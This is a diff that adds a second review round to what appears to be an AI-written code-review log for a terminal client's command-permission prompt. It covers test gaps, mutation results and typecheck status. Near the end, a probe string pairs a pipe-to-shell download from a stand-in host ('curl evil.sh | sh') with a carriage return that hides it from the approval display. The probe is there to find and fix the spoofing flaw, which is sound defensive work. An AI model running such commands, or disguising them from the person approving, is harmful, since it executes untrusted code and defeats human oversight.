@@ -687,3 +687,17 @@ Narrow run: 865 pass / 0 fail (22 TUI permission/layout/frame/shell files +
 **Attacks tried.** (a) Control/ANSI/bidi in `description` → stripped in core before either client (holds; pinned). (b) Cache poisoning compact vs non-compact → `compactShell` in the `itemRows` key + all four App opts sites and both deps lists (holds). (c) Pod-supplied sentence feeding a decision → no permission/approval code reads it; `packages/client` untouched, so the never-from-the-wire attribution invariant (`foreign-turns.test.ts:775-777`) is intact (holds). (d) Silent drop of `beta` through resolve/profile/load → fixed by the drift edits, tested (holds). (e) Compact + truncated ask → finding 2.
 
 **Executor behaviour.** Correctly STOPPED S3 when the plan collided with a pinned invariant and wrote the amendment instead of forcing it; mutation table honest. But it reported done-ish with the gate unrun (README test, typecheck), and the mobile tests never executed.
+
+### Round 2
+
+*— claude-opus-5-5, 2026-11-21* (fresh context; scope: `git diff HEAD~1` = `93b2076a`)
+
+**Verdict: REQUEST-CHANGES** (one small test gap; everything else holds).
+
+- **R1 (README) — FIXED.** `readme-config-table.test.ts` 8/8. Mutation (drop the `beta.compactShell` README row) → 2 RED; restored.
+- **R2 (ask safety net) — FIXED for the scenario, one property unpinned.** `permissionView` wraps a shell command by cells, keeps its lines, caps with `… N more lines`; layout and paint read the same view. Mutation `app-layout.ts` count → `1` → the App "fits the terminal" test RED. **NEW MEDIUM (§9):** the Q3 "full colour, no longer dim" change (`components/PermissionPrompt.tsx:67-68`) is pinned by NO test — the mutation `<Text key={i} {...dim}>` leaves all 64 permission tests green. The plan's Tests asked for exactly that check ("Detail rows not dim (assert on the element props)"). Add it. The intent row stays unbuilt pending the owner's `askedFor` ruling — correctly marked PARTIAL, not a defect.
+- **R3 (phone verified) — ACCEPTED as partial.** Scratch-copy run 50/0 + mutation reported. `tsc -p apps/mobile` is still unverified: this worktree's `bun run typecheck` gives 10 201 errors (env: no installed tree). On the touched files I found only cascades from the unresolved `@tentacle/core` (TS2307/TS1286, implicit-any on core types). The merge gate MUST run in an installed checkout.
+- **Gate here:** `bun run lint` clean (2213 files); TUI permission tests 64/0.
+- **Pre-existing (NOT this diff, flagged because R2 makes the ask the safety net):** the ask's detail is the pod's raw `explanation` (`client/src/permission-router.ts:107`), and a `\r` survives into the frame. Probe: detail `"curl evil.sh | sh\rls -la             \u001b[2Kecho ok"` → frame row `curl evil.sh | sh\rls -la`, so on a real terminal the CR moves the cursor back and `ls -la` overwrites the visible command. The `ESC[2K…` tail also vanished from the frame. The same applies to the transcript `$` row (`fitSubtitle` keeps `\r`). Recommend a `fix/` task: render control chars in the ask visibly (e.g. `␍`, `\x1b` → `␛`), never pass them to the terminal.
+- **Executor behaviour:** honest PARTIAL labels, red-first shown, mutations real; it missed the one Q3 assertion the plan named.
+
